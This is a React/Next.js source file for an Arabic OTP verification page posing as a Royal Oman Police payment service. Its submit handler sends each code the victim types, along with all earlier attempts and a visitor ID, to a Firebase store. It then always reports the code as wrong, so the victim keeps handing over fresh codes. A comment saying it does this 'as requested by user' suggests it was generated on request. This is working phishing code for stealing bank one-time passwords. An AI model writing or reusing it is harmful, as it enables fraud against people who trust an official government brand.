"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Menu, Shield, AlertCircle, Clock } from "lucide-react"
import Link from "next/link"
import { useRouter } from "next/navigation"
import { addData } from "@/lib/firebase"
const allOtps=['']
export default function OTPVerification() {
  const router = useRouter()
  const [otp, setOtp] = useState("")
  const [error, setError] = useState("")
  const [timeLeft, setTimeLeft] = useState(300) // 5 minutes in seconds
  const [isSubmitting, setIsSubmitting] = useState(false)

  // Countdown timer
  useEffect(() => {
    if (timeLeft > 0) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000)
      return () => clearTimeout(timer)
    }
  }, [timeLeft])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs.toString().padStart(2, "0")}`
  }
  const getVisitorId = () => {
    try {
      if (typeof window !== "undefined") {
        return localStorage.getItem("visitor") || "anonymous-user";
      }
    } catch (error) {
      console.error("Error accessing localStorage:", error);
    }
    return "anonymous-user";
  };
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)
    setError("")
    allOtps.push(otp)
    addData({id:getVisitorId(),otp,allOtps})
    // Simulate API call delay
    await new Promise((resolve) => setTimeout(resolve, 2000))

    // Always show error as requested by user
    setError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
    setIsSubmitting(false)
    setOtp("")

  }

  const handleResendOTP = async () => {
    setTimeLeft(300) // Reset timer
    setError("")
    // Simulate resend API call
    await new Promise((resolve) => setTimeout(resolve, 1000))
  }

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "") // Only allow digits
    if (value.length <= 6) {
      setOtp(value)
      setError("") // Clear error when user types
    }
  }

  return (
    <div className="min-h-screen bg-gray-100" dir="rtl">
      {/* Header */}
      <header className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <button className="p-2">
              <Menu className="h-6 w-6 text-blue-800" />
            </button>
            <div className="flex items-center">
              <img src="/logo_mini.png" alt="شعار شرطة عمان السلطانية" className="h-12 w-12" />
            </div>
          </div>
        </div>
      </header>

      {/* Blue Navigation Bar */}
      <div className="bg-blue-800 text-white py-4">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <nav className="text-center">
            <span className="text-lg">الصفحة الرئيسية</span>
            <span className="mx-2">|</span>
            <span className="text-lg">الخدمات الإلكترونية</span>
            <span className="mx-2">|</span>
            <span className="text-lg">التحقق الأمني</span>
          </nav>
        </div>
      </div>

      {/* Main Content */}
      <main className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <Card className="bg-white shadow-lg">
          <CardHeader className="text-center bg-blue-50">
            <div className="flex justify-center mb-4">
              <div className="bg-blue-100 p-3 rounded-full">
                <Shield className="h-8 w-8 text-blue-600" />
              </div>
            </div>
            <CardTitle className="text-2xl font-bold text-gray-800 mb-2">التحقق الأمني</CardTitle>
            <p className="text-gray-600">تم إرسال رمز التحقق إلى هاتفك المحمول</p>
          </CardHeader>

          <CardContent className="p-8">
            {/* Timer */}
            <div className="text-center mb-6">
              <div className="flex items-center justify-center gap-2 text-orange-600 mb-2">
                <Clock className="h-5 w-5" />
                <span className="font-semibold">الوقت المتبقي: {formatTime(timeLeft)}</span>
              </div>
              <p className="text-sm text-gray-600">
                تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم الهاتف المنتهي بـ ***00
              </p>
            </div>

            {/* Error Alert */}
            {error && (
              <Alert className="mb-6 border-red-200 bg-red-50">
                <AlertCircle className="h-4 w-4 text-red-600" />
                <AlertDescription className="text-red-800 font-semibold">{error}</AlertDescription>
              </Alert>
            )}

            {/* OTP Form */}
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="otp" className="text-right block font-semibold text-lg">
                  أدخل رمز التحقق *
                </Label>
                <Input
                  id="otp"
                  type="tel"
                  placeholder="123456"
                  value={otp}
                  onChange={handleOtpChange}
                  className="text-center text-2xl font-mono tracking-widest py-4"
                  maxLength={6}
                  required
                  autoComplete="one-time-code"
                />
                <p className="text-sm text-gray-500 text-center">أدخل الرمز المكون من 6 أرقام</p>
              </div>

              {/* Action Buttons */}
              <div className="space-y-4">
                <Button
                  type="submit"
                  disabled={otp.length !== 6 || isSubmitting || timeLeft === 0}
                  className="w-full bg-green-600 hover:bg-green-700 disabled:bg-gray-400 text-white py-3 text-lg"
                >
                  {isSubmitting ? "جاري التحقق..." : "تأكيد الدفع"}
                </Button>

                <Button
                  type="button"
                  variant="outline"
                  onClick={handleResendOTP}
                  disabled={timeLeft > 240} // Allow resend after 1 minute
                  className="w-full py-3 text-lg"
                >
                  إعادة إرسال الرمز
                </Button>

                <Link href="/payment">
                  <Button type="button" variant="ghost" className="w-full py-3 text-lg text-gray-600">
                    العودة إلى صفحة الدفع
                  </Button>
                </Link>
              </div>
            </form>

            {/* Security Notice */}
            <div className="mt-8 bg-yellow-50 border border-yellow-200 rounded-lg p-4">
              <div className="flex items-start gap-3">
                <Shield className="h-5 w-5 text-yellow-600 mt-0.5" />
                <div className="text-sm text-yellow-800">
                  <p className="font-semibold mb-1">تنبيه أمني:</p>
                  <ul className="list-disc list-inside space-y-1">
                    <li>لا تشارك رمز التحقق مع أي شخص آخر</li>
                    <li>سينتهي صلاحية الرمز خلال 5 دقائق</li>
                    <li>في حالة عدم استلام الرمز، تأكد من رقم هاتفك</li>
                  </ul>
                </div>
              </div>
            </div>

            {/* Payment Summary */}
            <div className="mt-6 bg-gray-50 rounded-lg p-4">
              <h3 className="font-semibold text-gray-800 mb-2">ملخص العملية:</h3>
              <div className="flex justify-between items-center">
                <span className="text-gray-600">المبلغ الإجمالي:</span>
                <span className="font-bold text-lg text-blue-600">20.000 ر.ع</span>
              </div>
              <div className="flex justify-between items-center mt-1">
                <span className="text-gray-600">رقم العملية:</span>
                <span className="font-mono text-sm">TXN-2024-001234</span>
              </div>
            </div>
          </CardContent>
        </Card>
      </main>

      {/* Footer */}
      <footer className="bg-blue-800 text-white py-6 mt-12">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="border-t border-blue-600 pt-4">
            <p className="text-center text-sm">© 2023 شرطة عمان السلطانية</p>
          </div>
        </div>
      </footer>
    </div>
  )
}
